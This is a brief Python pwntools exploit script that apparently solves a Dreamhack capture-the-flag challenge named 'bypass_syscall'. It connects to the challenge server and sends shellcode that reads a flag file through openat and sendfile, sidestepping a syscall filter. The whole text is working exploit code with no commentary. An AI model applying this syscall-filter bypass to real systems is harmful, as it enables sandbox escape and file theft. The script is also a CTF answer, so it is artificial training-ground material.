from pwn import *

context.arch = "x86_64"
context.log_level = "debug"

LOCAL = False
if LOCAL:
    p = process("./bypass_syscall")
else:
    PORT = int(input("PORT: "))
    HOST = int(input("HOST: "))
    p = remote("host"+str(HOST)+".dreamhack.games", PORT)


def slog(name, addr):
    return success(name + ": " + str(hex(addr)))


shellcode = shellcraft.openat(0, "/home/bypass_syscall/flag")
shellcode += "mov r10, 0xffff"
shellcode += shellcraft.sendfile(1, 'rax', 0).replace("xor r10d, r10d", "")
shellcode += shellcraft.exit(0)
p.sendline(asm(shellcode))
p.interactive()
# print(shellcode)
